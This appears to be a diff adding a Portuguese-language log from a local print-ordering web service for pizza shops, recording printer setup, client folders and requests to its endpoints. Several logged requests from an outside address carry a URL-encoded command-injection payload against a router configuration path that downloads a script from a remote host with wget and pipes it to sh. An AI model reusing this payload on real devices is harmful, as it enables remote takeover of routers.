@@ -1,0 +1,52 @@
+13/05/2024 - 21:50
+
+21:50.07 - (PrintSystem): Criando Torres... (3)
+21:50.07 - (PrintSystem): Criando Impressoras... (3)
+21:50.07 - (PrintSystem):     Torre1: 
+21:50.07 - (PrintSystem):         Impressora1: IMP1
+21:50.07 - (PrintSystem):         Impressora2: IMP2
+21:50.07 - (PrintSystem):         Impressora3: IMP3
+21:50.07 - (PrintSystem):     Torre2: 
+21:50.07 - (PrintSystem):         Impressora1: IMP4
+21:50.07 - (PrintSystem):         Impressora2: IMP5
+21:50.07 - (PrintSystem):         Impressora3: IMP6
+21:50.07 - (PrintSystem):     Torre3: 
+21:50.07 - (PrintSystem):         Impressora1: IMP7
+21:50.07 - (PrintSystem):         Impressora2: IMP8
+21:50.07 - (PrintSystem):         Impressora3: IMP9
+21:50.07 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+21:50.07 - (PrintSystem): Encontrado:
+21:50.07 - (PrintSystem):     "Rei da pizza"
+21:50.07 - (PrintSystem):     "Rps Entre Rios"
+21:50.07 - (SaveSystem): Carregando configurações salvas...
+21:50.07 - (SaveSystem): Arquivos de configurações salvas encontrados: 
+21:50.07 - (SaveSystem):     "Saved\offsets.sdat"
+21:50.07 - (SaveSystem):     "Saved\sizes.sdat"
+21:50.07 - (SaveSystem):     "Saved\types.sdat"
+21:50.07 - (WebService): Iniciando Endpoints
+21:50.07 - (WebService): Porta: 80
+21:50.12 - (Edit): C:\Users\Edu\Documents\FakeImages\Rps Entre Rios-Media-PizzaOitavada.png
+21:50.12 - (WebService): Request de '192.168.3.156:55276' no endpoint '/edit'.
+21:50.12 - (PrintSystem): Tentando imprimir na impressora 1 da torre 1
+21:50.16 - (WebService): Request de '192.168.3.156:55277' no endpoint '/print'.
+21:52.21 - (Edit): C:\Users\Edu\Documents\FakeImages\Rps Entre Rios-Media-PizzaOitavada.png
+21:52.21 - (WebService): Request de '192.168.3.156:55278' no endpoint '/edit'.
+21:52.21 - (PrintSystem): Tentando imprimir na impressora 1 da torre 1
+21:52.24 - (WebService): Request de '192.168.3.156:55279' no endpoint '/print'.
+22:08.35 - (WebService): Request of '185.191.126.213:49164' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60wget+http%3A%2F%2F103.149.86.202%2Ft+-O-+|+sh%60)' endpoint. (404)
+22:24.10 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+22:24.10 - (PrintSystem): Encontrado:
+22:24.10 - (PrintSystem):     "Rei da pizza"
+22:24.10 - (PrintSystem):     "Rps Entre Rios"
+22:24.10 - (WebService): Request de '149.50.110.239:39112' no endpoint '/'.
+22:24.13 - (WebService): Request de '192.168.3.156:55287' no endpoint '/clientes'.
+22:24.13 - (WebService): Request de '192.168.3.156:55288' no endpoint '/tamanhos'.
+22:24.13 - (WebService): Request de '192.168.3.156:55289' no endpoint '/tipos'.
+22:52.25 - (WebService): Request of '185.180.143.136:57758' at '/cgi-bin/main.pl' endpoint. (404)
+22:54.42 - (WebService): Request of '185.191.126.213:40276' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60wget+http%3A%2F%2F103.149.86.202%2Ft+-O-+|+sh%60)' endpoint. (404)
+23:41.09 - (WebService): Request of '185.191.126.213:37412' at '/cgi-bin/luci/;stok=/locale?form=country&operation=write&country=(id%3E%60wget+http%3A%2F%2F103.149.86.202%2Ft+-O-+|+sh%60)' endpoint. (404)
+00:33.39 - (PrintSystem): Procurando por clientes...(C:\Users\Edu\Documents\FakeImages)
+00:33.39 - (PrintSystem): Encontrado:
+00:33.39 - (PrintSystem):     "Rei da pizza"
+00:33.39 - (PrintSystem):     "Rps Entre Rios"
+00:33.39 - (WebService): Request de '207.192.240.242:1118' no endpoint '/'.
